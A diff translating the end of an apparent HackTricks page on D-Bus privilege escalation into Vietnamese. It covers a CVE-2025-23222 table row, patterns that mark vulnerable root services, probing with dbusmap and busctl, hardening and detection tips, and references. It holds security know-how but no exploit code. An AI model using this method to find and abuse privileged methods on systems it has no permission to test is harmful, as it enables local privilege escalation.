+| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.19 | Một proxy tương thích chạy với quyền root chuyển tiếp yêu cầu đến các service backend mà không giữ nguyên ngữ cảnh bảo mật của caller ban đầu, khiến backend tin proxy là UID 0. | Xem các service D-Bus dạng **proxy / bridge / tương thích** là một nhóm lỗi riêng: nếu chúng chuyển tiếp các lệnh gọi có đặc quyền, hãy xác minh UID/Polkit context của caller được chuyển đến backend như thế nào. |
 
-Patterns to notice:
-1. Service runs **as root on the system bus**.
-2. Either there is **no authorization check**, or the check is performed against the **wrong subject**.
-3. The reachable method eventually changes system state: package install, user/group changes, bootloader config, device profile updates, file writes, or direct command execution.
+Các mẫu cần lưu ý:
+1. Service chạy **với quyền root trên system bus**.
+2. Hoặc **không có bước kiểm tra ủy quyền**, hoặc bước kiểm tra được thực hiện với **đối tượng không đúng**.
+3. Phương thức có thể truy cập cuối cùng làm thay đổi trạng thái hệ thống: cài đặt package, thay đổi người dùng/nhóm, cấu hình bootloader, cập nhật profile thiết bị, ghi tệp hoặc thực thi lệnh trực tiếp.
 
-Use `dbusmap --enable-probes` or manual `busctl call` to confirm whether a method is reachable, then inspect the service's policy XML and Polkit actions to understand **which subject** is actually being authorized.
+Dùng `dbusmap --enable-probes` hoặc `busctl call` thủ công để xác nhận một phương thức có thể được truy cập hay không, sau đó kiểm tra policy XML của service và các Polkit action để hiểu **đối tượng nào** thực sự được cấp quyền.
 
 ---
 
-## Hardening & Detection Quick-Wins
+## Các biện pháp nhanh để tăng cường bảo mật và phát hiện
 
-* Search for world-writable or *send/receive*-open policies:
+* Tìm các policy cho phép mọi người ghi hoặc mở *send/receive*:
   ```bash
   grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
   ```
-* Require Polkit for dangerous methods – even *root* proxies should pass the *caller* PID to `polkit_authority_check_authorization_sync()` instead of their own.
-* Drop privileges in long-running helpers (use `sd_pid_get_owner_uid()` to switch namespaces after connecting to the bus).
-* If you cannot remove a service, at least *scope* it to a dedicated Unix group and restrict access in its XML policy.
-* Blue-team: capture the system bus with `busctl capture > /var/log/dbus_$(date +%F).pcapng` and import it into Wireshark for anomaly detection.
+* Yêu cầu Polkit cho các method nguy hiểm – ngay cả các proxy chạy với quyền *root* cũng nên truyền PID của *caller* vào `polkit_authority_check_authorization_sync()` thay vì PID của chính chúng.
+* Hạ quyền trong các helper chạy lâu dài (dùng `sd_pid_get_owner_uid()` để chuyển namespace sau khi kết nối với bus).
+* Nếu không thể gỡ bỏ một service, ít nhất hãy giới hạn service đó trong một Unix group riêng và hạn chế quyền truy cập trong policy XML.
+* Blue-team: ghi lại system bus bằng `busctl capture > /var/log/dbus_$(date +%F).pcapng` rồi nhập dữ liệu vào Wireshark để phát hiện bất thường.
 
 ---
 
 ## References
 
-- [1] [USBCreator D-Bus Privilege Escalation in Ubuntu Desktop](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
-- [2] [CVE-2024-45752: D-Bus service allows configuration by any unprivileged user](https://github.com/PixlOne/logiops/issues/473)
-- [3] [dde-api-proxy: Authentication Bypass in Deepin D-Bus Proxy Service (CVE-2025-23222)](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)
+- [1] [USBCreator: leo thang đặc quyền qua D-Bus trong Ubuntu Desktop](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
+- [2] [CVE-2024-45752: D-Bus service cho phép mọi người dùng không có đặc quyền cấu hình](https://github.com/PixlOne/logiops/issues/473)
+- [3] [dde-api-proxy: bỏ qua xác thực trong dịch vụ D-Bus proxy Deepin (CVE-2025-23222)](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)
 - [4] [D-Bus - Wikipedia](https://en.wikipedia.org/wiki/D-Bus)
-- [5] [taviso/dbusmap - "Nmap for D-Bus"](https://github.com/taviso/dbusmap)
+- [5] [taviso/dbusmap - "Nmap cho D-Bus"](https://github.com/taviso/dbusmap)
 - [6] [initstring/uptux](https://github.com/initstring/uptux)
-- [7] [dbus.freedesktop.org - D-Bus documentation](http://dbus.freedesktop.org/doc/dbus-specification.html)
-
+- [7] [dbus.freedesktop.org - tài liệu D-Bus](http://dbus.freedesktop.org/doc/dbus-specification.html)
 {{#include ../../banners/hacktricks-training.md}}
